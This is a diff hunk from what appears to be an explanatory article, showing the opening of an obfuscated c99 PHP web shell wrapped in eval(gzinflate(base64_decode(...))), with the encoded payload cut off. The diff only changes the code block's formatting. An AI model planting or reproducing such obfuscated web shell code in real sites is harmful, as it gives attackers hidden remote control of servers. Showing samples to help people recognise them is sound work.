@@ -22,7 +22,7 @@ This is what an encrypted c99 shell script looks like:
 
 ### C99 Shell (encrypted) source code
 
-{% highlight php %}<? eval(gzinflate(base64_decode('FJ3HjuvKkkV/pWd9AQ7oHfDwLuiN6K3ISYOe
+{% highlight php linenos %}<? eval(gzinflate(base64_decode('FJ3HjuvKkkV/pWd9AQ7oHfDwLuiN6K3ISYOe
 ovfu65s1q4NTUlVmRsRei0VJ//73P//+T3Ek3T/V8xvKLtmKf9JkLQjs//IiG/Pin/8VV
 VRsdi/p27icwpxWGVBXRTRXHlPq3WxbKUOPvguRT7FfQfOYmw9NAnT6uRsQLGgQPJCSah
 uyBJbBhGN6n0owNrtQ2BpQDH1ALHwQvPdlNi7T2yaU8X6ylJw3lySukouRGm62v+V+4Pd
